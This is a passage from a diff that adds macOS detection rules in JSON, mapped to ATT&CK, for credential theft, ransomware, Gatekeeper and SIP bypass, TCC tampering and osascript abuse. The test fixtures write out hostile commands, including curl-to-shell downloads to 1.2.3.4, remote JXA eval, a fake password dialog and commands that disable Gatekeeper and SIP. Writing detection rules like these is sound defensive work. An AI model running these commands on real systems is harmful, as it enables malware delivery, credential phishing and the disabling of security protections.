+      "operation": "create"
+     },
+     {
+      "path": "/private/tmp/login.keychain-db",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-browser-profile-db-in-temp",
+   "name": "Browser credential DB staged in temp",
+   "description": "A Chrome/Firefox/Safari credential or cookie store name was created in a temp location.",
+   "tactic": "Credential Access",
+   "technique": "T1555.003",
+   "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(private/)?(tmp|var/tmp)/.*(login data|logins\\.json|key4\\.db|cookies\\.sqlite|binarycookies)$|^/users/shared/.*(login data|logins\\.json|key4\\.db|binarycookies)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "browser"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/tmp/Login Data",
+      "operation": "create"
+     },
+     {
+      "path": "/private/tmp/key4.db",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/tmp/data.csv",
+      "operation": "create"
+     },
+     {
+      "path": "/private/tmp/Login Data",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-ransom-note-created",
+   "name": "Ransom note file created",
+   "description": "A file named like a ransom note was created in a user directory.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/users/.*(readme_to_decrypt|how_to_(decrypt|recover)|decrypt_instructions|recover_your_files|restore_files)[^/]*\\.(txt|html|hta|md)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "ransomware"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/Documents/HOW_TO_DECRYPT.txt",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/Documents/how-to-guide.txt",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/Documents/HOW_TO_DECRYPT.txt",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-encrypted-extension-created",
+   "name": "File created with ransomware-style extension",
+   "description": "A user file was created with an extension used by ransomware families.",
+   "tactic": "Impact",
+   "technique": "T1486",
+   "technique_name": "Data Encrypted for Impact",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/users/.*\\.(locked|lockbit|encrypted|crypt|crypted|enc[0-9]|akira|blackcat)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "ransomware"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/Documents/q3.xlsx.locked",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/Documents/q3.xlsx",
+      "operation": "create"
+     },
+     {
+      "path": "/Users/ann/Documents/q3.xlsx.locked",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-time-machine-backup-deleted",
+   "name": "Time Machine backup data deleted",
+   "description": "Files were deleted from a Time Machine backup store.",
+   "tactic": "Impact",
+   "technique": "T1490",
+   "technique_name": "Inhibit System Recovery",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/backups\\.backupdb/|\\.sparsebundle/bands/"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "delete"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "backup"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Volumes/TM/Backups.backupdb/mac/2026-01-01/a",
+      "operation": "delete"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Volumes/Data/other/a",
+      "operation": "delete"
+     },
+     {
+      "path": "/Volumes/TM/Backups.backupdb/mac/2026-01-01/a",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-osascript-admin-shell",
+   "name": "osascript shell command with administrator privileges",
+   "description": "AppleScript runs a shell command with administrator privileges, the standard prompt-for-password escalation trick.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1059.002",
+   "technique_name": "Command and Scripting Interpreter: AppleScript",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "do shell script"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "with administrator privileges"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "osascript"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e \"do shell script \\\"id\\\" with administrator privileges\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e \"display notification \\\"done\\\"\""
+     },
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e \"do shell script \\\"id\\\"\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-osascript-fake-dialog-credential",
+   "name": "osascript fake system dialog requesting credentials",
+   "description": "An AppleScript dialog with a caution icon and credential wording, used to phish the login password.",
+   "tactic": "Credential Access",
+   "technique": "T1056.002",
+   "technique_name": "Input Capture: GUI Input Capture",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "display dialog"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "patterns": [
+         "enter your password",
+         "requires your password",
+         "system preferences wants",
+         "macos needs your password"
+        ]
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "icon"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "phishing"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'display dialog \"macOS needs your password to continue\" with icon caution default answer \"\"'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'display dialog \"Done\" with icon note'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-osascript-do-shell-download",
+   "name": "osascript fetching remote content via do shell script",
+   "description": "AppleScript invokes curl or wget through do shell script, a downloader pattern in loaders and trojanized installers.",
+   "tactic": "Command and Control",
+   "technique": "T1105",
+   "technique_name": "Ingress Tool Transfer",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "do shell script"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\b(curl|wget)\\b"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "osascript",
+    "downloader"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e \"do shell script \\\"curl -s http://1.2.3.4/p | sh\\\"\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e \"do shell script \\\"ls\\\"\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-jxa-objc-import",
+   "name": "JavaScript for Automation with ObjC bridge",
+   "description": "osascript in JavaScript mode imports the Objective-C bridge, used for in-memory API access without a compiled binary.",
+   "tactic": "Execution",
+   "technique": "T1059.007",
+   "technique_name": "Command and Scripting Interpreter: JavaScript",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "patterns": [
+         "-l javascript",
+         "-l jxa"
+        ]
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "patterns": [
+         "objc.import",
+         "$.nsstring",
+         "nstask"
+        ]
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "jxa"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -l JavaScript -e \"ObjC.import('Cocoa'); $.NSTask\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -l JavaScript script.js"
+     },
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e \"tell app \\\"Finder\\\" to activate\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-jxa-run-remote-script",
+   "name": "osascript JXA evaluating downloaded text",
+   "description": "JXA code evaluates a string pulled from the network (eval plus NSURL or curl).",
+   "tactic": "Execution",
+   "technique": "T1059.007",
+   "technique_name": "Command and Scripting Interpreter: JavaScript",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "javascript"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "eval("
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "patterns": [
+         "nsurl",
+         "curl",
+         "http"
+        ]
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "jxa"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://x/p')),4)))\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -l JavaScript -e \"eval(1+1)\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-osascript-from-office",
+   "name": "osascript spawned by Office application",
+   "description": "A Microsoft Office process launched osascript, which macro-based malware uses to reach the shell.",
+   "tactic": "Execution",
+   "technique": "T1204.002",
+   "technique_name": "User Execution: Malicious File",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "field": "parent_exe",
+      "op": "contains",
+      "patterns": [
+       "microsoft word",
+       "microsoft excel",
+       "microsoft powerpoint"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "office",
+    "macro"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "parent_exe": "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
+      "command": "osascript x.scpt"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "parent_exe": "/Applications/Terminal.app/Contents/MacOS/Terminal",
+      "command": "osascript x.scpt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-osascript-add-login-item",
+   "name": "osascript adds a login item",
+   "description": "AppleScript tells System Events to make a login item, a user-level persistence method.",
+   "tactic": "Persistence",
+   "technique": "T1547.015",
+   "technique_name": "Boot or Logon Autostart Execution: Login Items",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "make login item",
+       "make new login item"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "login-item"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/tmp/a.app\"}'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'tell application \"System Events\" to get the name of every login item'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-osascript-clipboard-read",
+   "name": "osascript reads the clipboard",
+   "description": "AppleScript reads the clipboard contents, used to harvest copied passwords or crypto addresses.",
+   "tactic": "Collection",
+   "technique": "T1115",
+   "technique_name": "Clipboard Data",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "the clipboard",
+       "clipboard info"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "clipboard"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e \"the clipboard\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e \"set volume 3\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-osascript-terminal-do-script",
+   "name": "osascript drives Terminal to run a script",
+   "description": "AppleScript instructs Terminal to run a command, a way to launch shell code from a script or document.",
+   "tactic": "Execution",
+   "technique": "T1059.002",
+   "technique_name": "Command and Scripting Interpreter: AppleScript",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "terminal"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "do script"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "osascript"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'tell application \"Terminal\" to do script \"curl x | sh\"'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'tell application \"Terminal\" to activate'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-osascript-keystroke-synth",
+   "name": "osascript sends keystrokes via System Events",
+   "description": "Scripted keystroke or key code synthesis through System Events can approve prompts or type into other apps.",
+   "tactic": "Execution",
+   "technique": "T1059.002",
+   "technique_name": "Command and Scripting Interpreter: AppleScript",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/osascript"
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "system events"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "patterns": [
+         "keystroke",
+         "key code"
+        ]
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "osascript"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'tell application \"System Events\" to keystroke \"y\"'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/osascript",
+      "command": "osascript -e 'tell application \"System Events\" to get name of every process'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-screencapture-silent-to-temp",
+   "name": "Silent screen capture written to temp",
+   "description": "screencapture in silent mode writing into a temp or shared folder, repeated by stalkerware and RATs.",
+   "tactic": "Collection",
+   "technique": "T1113",
+   "technique_name": "Screen Capture",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/screencapture"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*x[a-z]*\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/var/tmp/|/private/var/|/users/shared/|/\\.)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "screen"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/screencapture",
+      "command": "screencapture -x /tmp/s1.png"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/screencapture",
+      "command": "screencapture -x ~/Desktop/shot.png"
+     },
+     {
+      "executable": "/usr/sbin/screencapture",
+      "command": "screencapture -i /tmp/a.png"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-screencapture-video-or-loop",
+   "name": "Screen recording or looping capture",
+   "description": "screencapture video mode or a shell loop calling it repeatedly.",
+   "tactic": "Collection",
+   "technique": "T1113",
+   "technique_name": "Screen Capture",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "suffix",
+        "pattern": "/screencapture"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "\\s-[a-z]*v\\b"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "command",
+        "op": "contains",
+        "pattern": "screencapture"
+       },
+       {
+        "field": "command",
+        "op": "contains",
+        "patterns": [
+         "while true",
+         "sleep "
+        ]
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "screen"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/screencapture",
+      "command": "screencapture -V 60 /tmp/r.mov"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'while true; do screencapture -x /tmp/$RANDOM.png; sleep 30; done'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/screencapture",
+      "command": "screencapture -c"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-pbpaste-polling",
+   "name": "Clipboard polling loop",
+   "description": "pbpaste invoked inside a loop or appended to a file, a clipboard-harvesting or clipper pattern.",
+   "tactic": "Collection",
+   "technique": "T1115",
+   "technique_name": "Clipboard Data",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "pbpaste"
+     },
+     {
+      "any": [
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(while|for)\\b.*pbpaste"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "pbpaste\\s*>>"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "clipboard"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'while true; do pbpaste >> /tmp/c.txt; sleep 2; done'"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/pbpaste",
+      "command": "pbpaste"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'pbpaste | wc -c'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-tcc-db-sqlite-write",
+   "name": "sqlite3 writes TCC database",
+   "description": "sqlite3 edits tcc.db, granting privacy permissions without a user prompt.",
+   "tactic": "Defense Evasion",
+   "technique": "T1548",
+   "technique_name": "Abuse Elevation Control Mechanism",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "tcc.db"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "insert",
+       "update ",
+       "replace into",
+       "delete from"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "tcc"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 \"/Library/Application Support/com.apple.TCC/TCC.db\" \"INSERT or REPLACE INTO access VALUES(...)\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/sqlite3",
+      "command": "sqlite3 tcc.db \"select * from access\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-tcc-db-copy-or-read",
+   "name": "TCC database copied or dumped",
+   "description": "A process reads or copies tcc.db to learn which apps have sensitive permissions.",
+   "tactic": "Discovery",
+   "technique": "T1082",
+   "technique_name": "System Information Discovery",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "tcc.db"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "cp ",
+       "ditto ",
+       "select "
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "tcc"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/cp",
+      "command": "cp ~/Library/Application\\ Support/com.apple.TCC/TCC.db /tmp/t.db"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/vim",
+      "command": "vim notes-tcc.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-tccutil-reset-all",
+   "name": "tccutil reset All",
+   "description": "tccutil resets privacy decisions across all services, which can force re-prompts or clear evidence of prior grants.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/tccutil"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "reset\\s+all\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "tcc"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/tccutil",
+      "command": "tccutil reset All"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/tccutil",
+      "command": "tccutil reset Camera com.example.app"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-xattr-remove-quarantine",
+   "name": "Quarantine attribute removed",
+   "description": "xattr deletes com.apple.quarantine, skipping Gatekeeper checks on a downloaded file.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.001",
+   "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/xattr"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "com.apple.quarantine"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*d"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "\\s/applications/[^/]+\\.app/?(\\s|$)"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "gatekeeper",
+    "quarantine"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -d com.apple.quarantine /Users/ann/Downloads/x.app"
+     },
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -dr com.apple.quarantine /tmp/a"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -l /Users/ann/Downloads/x.app"
+     },
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -p com.apple.quarantine a"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-xattr-clear-all-tmp-app",
+   "name": "xattr clears all attributes on a payload in temp",
+   "description": "xattr -c/-cr on an app or binary under temp or Downloads strips quarantine and provenance in bulk.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.001",
+   "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/xattr"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*c[a-z]*\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/var/tmp/|/downloads/|/users/shared/)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "gatekeeper"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -cr /private/tmp/Installer.app"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/xattr",
+      "command": "xattr -c ~/Documents/a.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-spctl-disable-assessment",
+   "name": "Gatekeeper assessment disabled",
+   "description": "spctl is used to turn off or globally bypass Gatekeeper.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.001",
+   "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/spctl"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "--master-disable",
+       "--global-disable",
+       "--disable"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "gatekeeper"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --master-disable"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --status"
+     },
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --assess -v /Applications/Safari.app"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-spctl-allowlist-add",
+   "name": "Gatekeeper rule added for an app",
+   "description": "spctl --add whitelists an app from an unusual location in the Gatekeeper rule database.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.001",
+   "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/spctl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s--add\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/var/tmp/|/users/shared/|/downloads/)"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "gatekeeper"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --add /private/tmp/x.app"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/spctl",
+      "command": "spctl --status"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-csrutil-disable",
+   "name": "SIP disable requested",
+   "description": "csrutil disable or an authenticated-root disable was issued.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "critical",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/csrutil"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bdisable\\b"
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "sip"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/csrutil",
+      "command": "csrutil disable"
+     },
+     {
+      "executable": "/usr/bin/csrutil",
+      "command": "csrutil authenticated-root disable"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/csrutil",
+      "command": "csrutil status"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-nvram-boot-args-amfi",
+   "name": "nvram sets AMFI or SIP boot-args",
+   "description": "nvram writes boot-args that weaken AMFI or library validation, or csr-active-config.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/nvram"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "amfi_get_out_of_my_way",
+       "csr-active-config",
+       "amfi=",
+       "cs_enforcement_disable"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "macos",
+    "amfi"
+   ],
+   "batch": "a2-macos",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/nvram",
+      "command": "nvram boot-args=amfi_get_out_of_my_way=0x1"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/nvram",
+      "command": "nvram -p"
+     }
+    ]
+   }
+  },
+  {
+   "id": "macos-disable-library-validation",
+   "name": "Library validation disabled via defaults",
+   "description": "defaults write DisableLibraryValidation, permitting unsigned dylibs into hardened processes.",
+   "tactic": "Defense Evasion",
+   "technique": "T1562.001",
+   "technique_name": "Impair Defenses: Disable or Modify Tools",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "contains",
+      "pattern": "defaults write"
